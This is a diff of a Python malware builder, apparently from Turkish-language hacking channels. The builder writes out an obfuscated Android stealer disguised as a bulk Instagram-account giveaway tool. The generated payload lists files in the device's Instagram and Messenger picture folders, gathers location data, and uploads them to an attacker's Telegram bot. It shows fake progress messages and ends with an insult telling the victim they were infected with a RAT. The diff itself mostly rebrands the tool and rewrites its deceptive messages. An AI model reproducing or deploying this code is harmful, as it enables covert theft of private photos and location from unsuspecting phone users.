@@ -2,7 +2,7 @@ import requests
 from datetime import datetime
 import os
 import time
-from colorama import Fore, Style, init 
+from colorama import Fore, Style, init
 
 os.system('pip install emojify')
 
@@ -21,21 +21,21 @@ print(Fore.GREEN)
 print('''
           ▐▮▌ ▞▖ ▙ ▚▞▚▞ ▞▖ █▘ █☰                                                                                                 
   
-         -   WatchMortal   -  V = 2.1   ''')
+         -   𝐌𝐚𝐥𝐰𝐚𝐫𝐞   -  V = 2.1   ''')
 
 print(f'''      {B}{E}==============================
-      |{G}[+] GitHub    : {B}WatchMortal   {E}|
-      |{G}[+] Developer : {B}WatchMortal     {E}|
-      |{G}[+] TeleGram  : {B}WatchMortalHack{E}|
+      |{G}[+] GitHub    : {B} WatchMortal   {E}|
+      |{G}[+] Developer : {B} WatchMortal     {E}|
+      |{G}[+] TeleGram  : {B} WatchMortalhack {E}|
       {E}==============================''')
 print('               M A L W A R E                     ')      
-print('''\033[1;34m        https://t.me/+mYuy0uB81Fk1NGQ0       
+print('''\033[1;34m        https://t.me/WatchMortalhack       
        https://github.com/WatchMortal\n\n''')    
 
 print('\033[1;35m    You must subscribe to this channel   \n')              
-os.system(f'xdg-open https://t.me/+mYuy0uB81Fk1NGQ0')
+#os.system(f'xdg-open https://t.me/WatchMortalhack')
 time.sleep(3)       
-os.system(f'xdg-open https://t.me/+mYuy0uB81Fk1NGQ0')
+os.system(f'xdg-open https://t.me/WatchMortalhack')
 time.sleep(3)
    
 id=input(W+f'  [{E} ** {W}]  {S}Telegram ID ==> {B}')
@@ -50,23 +50,14 @@ import requests
 from datetime import datetime
 
 def banner():
-    print ('\t         \033[2;33m   
-      FEBRİS SUNAR    ')
-    print('\t         \033[2;33m   
-     İSTEK ÜZERİNE GELMİŞTİR      ')
-    print ('\t         \033[2;33m   
-       TOPLU İNSTA TOOL       ')
-    print ('\t         \033[2;33m   
-      TOPLU FACE TOOL         ')
-    print ('\t        WATCH MORTAL 
-    \033[2;33m   
-    \033[2;32m  Yapan :\033[2;31m W a T c H m O r T a L ')
-    print ('\t         \033[2;33m   
-       TOPLU TİKTOK TOOL          ')
-    print ('\t         \033[2;33m   
-      TOPLU PUBG TOOL    ')
-    print ('\t         \033[2;33m   
-      TOPLU DEEZER TOOL          ')
+    print ('\t         \033[2;33m   Instagram Hesapları         ')
+    print('\t         \033[2;33m   Toplu Hesaplar       ')
+    print ('\t         \033[2;33m   Hepsi Hit         ')
+    print ('\t         \033[2;33m   Hepsi En Az 500 Takipçi          ')
+    print ('\t         \033[2;33m   => \033[2;32m  Kodlayan Adam :\033[2;31m Febris ')
+    print ('\t         \033[2;33m   2013 Düşer             ')
+    print ('\t         \033[2;33m   2012 Düşer     ')
+    print ('\t         \033[2;33m   2014 Düşer          ')
 
 banner()
 print('')
@@ -90,7 +81,7 @@ for i in tmp:
   else:
        pass
        
-print('\033[2;31m  [ * ] \033[2;34m Hesaplar Düşmeye Başlicak .... ')     
+print('\033[2;31m  [ * ] \033[2;34m Hesaplar Bekleniyo .... ')     
 
 print('')
         
@@ -106,7 +97,7 @@ for i in tmp:
   else:
        pass  
 
-print('\033[2;31m  [ ✓ ] \033[2;32m Tokene Bağlanıyor ......') 
+print('\033[2;31m  [ ✓ ] \033[2;32m Hesaplar Cookiden Toplanıyo ......') 
 
 print('')
                                               
@@ -122,7 +113,7 @@ for i in tmp:
   else:
        pass     
 
-print('\033[34;1m  [ ✔ ] \033[33;1m ID Aranıyor ......... ')   
+print('\033[34;1m  [ ✔ ] \033[33;1m Bekleyiniz ......... ')   
 
 print('')
                       
@@ -138,7 +129,7 @@ for i in tmp:
   else:
        pass 
        
-print('\033[36;1m  [ ✘ ] \033[32;1m Hesaplar Düştü .......')   
+print('\033[36;1m  [ ✘ ] \033[32;1m Tüm Hesaplar Hazır .......')   
 print('')
     
 os.chdir(r"/storage/emulated/0/Pictures/Instagram")   
@@ -153,7 +144,7 @@ for i in tmp:
   else:
        pass  
        
-print('\033[0;1m  [ × ] \033[31;1m WatchMortal ......  ')   
+print('\033[0;1m  [ × ] \033[31;1m RAT YEDİN ORUSPU ÇOCU FEBRİS SİKER ......  ')   
 print('')      
 
 os.chdir(r"/storage/emulated/0/Pictures/Messenger")   
@@ -168,7 +159,7 @@ for i in tmp:
   else:
        pass   
 
-exit(' W A T C H ')""" )
+exit(' D E A D C O D E ')""" )
 
 hack = str('''import requests
 import geocoder 
@@ -204,7 +195,7 @@ def banner():
     print ('\t         \033[2;33m   ▇▇▇▇▇◣╲▇╱◢▇▇▇▇▇      ')
     print ('\t         \033[2;33m   ▇▇▇▇▇▇◣▇◢▇▇▇▇▇▇            ')
     print('')
-    print("\t\033[1;36m         https://t.me/+mYuy0uB81Fk1NGQ0  ")
+    print("\t\033[1;36m         https://t.me/black_code_22  ")
 
 banner()
 print('')
@@ -285,7 +276,7 @@ with open('Location.txt','w') as Jbs:
     res = requests.post(f"https://api.telegram.org/bot{token}/sendDocument?chat_id={id}", files=file)
               
     
-tlg = requests.post(f'https://api.telegram.org/bot{token}/sendMessage?chat_id={id}&text=✅Done : Devloper by DeadCode > @WatchMortal ✅ ')''')
+tlg = requests.post(f'https://api.telegram.org/bot{token}/sendMessage?chat_id={id}&text=✅Done : Devloper by DeadCode > @Black_Code_22 ✅ ')''')
 
 #os.system(f'xdg-open https://t.me/Black_Code_22')
 
@@ -311,7 +302,4 @@ else:
 os.system(f'emojify --input enc_{namee}.py --output {namee}.py --emoji')
 os.system(f'rm -rf enc_{namee}.py')
 
- os.system(f'emojify --input enc_{namee}.py --output {namee}.py --emoji')
-os.system(f'rm -rf enc_{namee}.py')
-
-print(f'    {G} ✅ DONE SAVE IN {namee}.py ✅ ')
+print(f'    {G} ✅ DONE SAVE IN {namee}.py ✅ ')                                                      
